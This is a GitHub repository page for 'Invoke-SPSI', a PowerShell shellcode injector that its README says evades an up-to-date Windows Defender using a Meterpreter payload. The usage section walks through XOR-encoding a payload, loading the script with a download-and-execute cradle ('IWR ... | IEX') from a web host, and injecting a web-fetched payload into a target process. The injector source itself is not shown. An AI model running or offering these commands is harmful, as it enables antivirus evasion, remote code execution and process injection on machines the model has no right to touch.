# https://github.com/t1Sh1n4/Invoke-SPSI

[Skip to content](https://github.com/t1Sh1n4/Invoke-SPSI#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/t1Sh1n4/Invoke-SPSI) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/t1Sh1n4/Invoke-SPSI) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/t1Sh1n4/Invoke-SPSI) to refresh your session.Dismiss alert

{{ message }}

[t1Sh1n4](https://github.com/t1Sh1n4)/ **[Invoke-SPSI](https://github.com/t1Sh1n4/Invoke-SPSI)** Public

- [Notifications](https://github.com/login?return_to=%2Ft1Sh1n4%2FInvoke-SPSI) You must be signed in to change notification settings
- [Fork\\
8](https://github.com/login?return_to=%2Ft1Sh1n4%2FInvoke-SPSI)
- [Star\\
37](https://github.com/login?return_to=%2Ft1Sh1n4%2FInvoke-SPSI)


Invoke-SPSI - Simple PowerShell Shellcode Injector


### License

[MIT license](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/LICENSE)

[37\\
stars](https://github.com/t1Sh1n4/Invoke-SPSI/stargazers) [8\\
forks](https://github.com/t1Sh1n4/Invoke-SPSI/forks) [Branches](https://github.com/t1Sh1n4/Invoke-SPSI/branches) [Tags](https://github.com/t1Sh1n4/Invoke-SPSI/tags) [Activity](https://github.com/t1Sh1n4/Invoke-SPSI/activity)

[Star](https://github.com/login?return_to=%2Ft1Sh1n4%2FInvoke-SPSI)

[Notifications](https://github.com/login?return_to=%2Ft1Sh1n4%2FInvoke-SPSI) You must be signed in to change notification settings

# t1Sh1n4/Invoke-SPSI

main

[**1** Branch](https://github.com/t1Sh1n4/Invoke-SPSI/branches) [**0** Tags](https://github.com/t1Sh1n4/Invoke-SPSI/tags)

[Go to Branches page](https://github.com/t1Sh1n4/Invoke-SPSI/branches)[Go to Tags page](https://github.com/t1Sh1n4/Invoke-SPSI/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![t1Sh1n4](https://avatars.githubusercontent.com/u/214700413?v=4&size=40)](https://github.com/t1Sh1n4)[t1Sh1n4](https://github.com/t1Sh1n4/Invoke-SPSI/commits?author=t1Sh1n4)<br>[Update Invoke-SPSI.ps1](https://github.com/t1Sh1n4/Invoke-SPSI/commit/31105499aa5d38c272906538a72db2c92662794d)<br>4 months agoOct 9, 2025<br>[3110549](https://github.com/t1Sh1n4/Invoke-SPSI/commit/31105499aa5d38c272906538a72db2c92662794d) · 4 months agoOct 9, 2025<br>## History<br>[3 Commits](https://github.com/t1Sh1n4/Invoke-SPSI/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/t1Sh1n4/Invoke-SPSI/commits/main/) 3 Commits |
| [images](https://github.com/t1Sh1n4/Invoke-SPSI/tree/main/images "images") | [images](https://github.com/t1Sh1n4/Invoke-SPSI/tree/main/images "images") | [Initial commit](https://github.com/t1Sh1n4/Invoke-SPSI/commit/2f2517bd81455324e191068d3fac3af39f0c530b "Initial commit") | 6 months agoAug 12, 2025 |
| [Invoke-SPSI.ps1](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/Invoke-SPSI.ps1 "Invoke-SPSI.ps1") | [Invoke-SPSI.ps1](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/Invoke-SPSI.ps1 "Invoke-SPSI.ps1") | [Update Invoke-SPSI.ps1](https://github.com/t1Sh1n4/Invoke-SPSI/commit/31105499aa5d38c272906538a72db2c92662794d "Update Invoke-SPSI.ps1") | 4 months agoOct 9, 2025 |
| [LICENSE](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/t1Sh1n4/Invoke-SPSI/commit/56cc694ceb3581078880f61aaa2534d63c67b23e "Initial commit") | 6 months agoAug 12, 2025 |
| [README.md](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/README.md "README.md") | [README.md](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/README.md "README.md") | [Initial commit](https://github.com/t1Sh1n4/Invoke-SPSI/commit/2f2517bd81455324e191068d3fac3af39f0c530b "Initial commit") | 6 months agoAug 12, 2025 |
| [xor.py](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/xor.py "xor.py") | [xor.py](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/xor.py "xor.py") | [Initial commit](https://github.com/t1Sh1n4/Invoke-SPSI/commit/2f2517bd81455324e191068d3fac3af39f0c530b "Initial commit") | 6 months agoAug 12, 2025 |
| View all files |

## Repository files navigation

# Invoke-SPSI - Simple PowerShell Shellcode Injector

[Permalink: Invoke-SPSI - Simple PowerShell Shellcode Injector](https://github.com/t1Sh1n4/Invoke-SPSI#invoke-spsi---simple-powershell-shellcode-injector)

Basic PowerShell script that decrypts an XOR-encrypted payload in memory, then uses a .NET-based D/Invoke implementation to call Win32 APIs for injecting shellcode into a remote process.

This script is a good example of how a fully updated Windows Defender can still be bypassed using a highly signatured Meterpreter payload and a very simple injection method.

**Do not use in real engagements.** The main focus is CTFs and very lightweight infrastructures.

It will **not** bypass modern EDR solutions or paid antivirus products.

* * *

[![demo](https://github.com/t1Sh1n4/Invoke-SPSI/raw/main/images/image.png)](https://github.com/t1Sh1n4/Invoke-SPSI/blob/main/images/image.png)

## Usage

[Permalink: Usage](https://github.com/t1Sh1n4/Invoke-SPSI#usage)

1. Encode your payload with XOR:

```
python3 xor.py -i calc.bin -k f62f054feab9fc06424fa3a2795d7286 -o calc.enc
```

2. Load Invoke-SPSI.ps1 in Powershell:

```
#1 web
IWR -uri http://example.com/Invoke-SPSI.ps1 | IEX
#2 local file
Get-Content C:\Invoke-SPSI.ps1 -Raw | IEX
```

3. Invoke and pass arguments:

```
#1 fetch payload from web
Invoke-SPSI -url http://example.com/payload.enc -TargetProcess Notepad -key f62f05...
#2 fetch payload from local file
Invoke-SPSI -File C:\payload.enc -TargetProcess Notepad -key f62f05...
```

* * *

## Disclaimer

[Permalink: Disclaimer](https://github.com/t1Sh1n4/Invoke-SPSI#disclaimer)

For educational purposes only.

The author is not responsible for any misuse of this code.

## About

Invoke-SPSI - Simple PowerShell Shellcode Injector


### Resources

[Readme](https://github.com/t1Sh1n4/Invoke-SPSI#readme-ov-file)

### License

[MIT license](https://github.com/t1Sh1n4/Invoke-SPSI#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/t1Sh1n4/Invoke-SPSI).

[Activity](https://github.com/t1Sh1n4/Invoke-SPSI/activity)

### Stars

[**37**\\
stars](https://github.com/t1Sh1n4/Invoke-SPSI/stargazers)

### Watchers

[**0**\\
watching](https://github.com/t1Sh1n4/Invoke-SPSI/watchers)

### Forks

[**8**\\
forks](https://github.com/t1Sh1n4/Invoke-SPSI/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Ft1Sh1n4%2FInvoke-SPSI&report=t1Sh1n4+%28user%29)

## [Releases](https://github.com/t1Sh1n4/Invoke-SPSI/releases)

No releases published

## [Packages\  0](https://github.com/users/t1Sh1n4/packages?repo_name=Invoke-SPSI)

No packages published

## Languages

- [PowerShell69.2%](https://github.com/t1Sh1n4/Invoke-SPSI/search?l=powershell)
- [Python30.8%](https://github.com/t1Sh1n4/Invoke-SPSI/search?l=python)

You can’t perform that action at this time.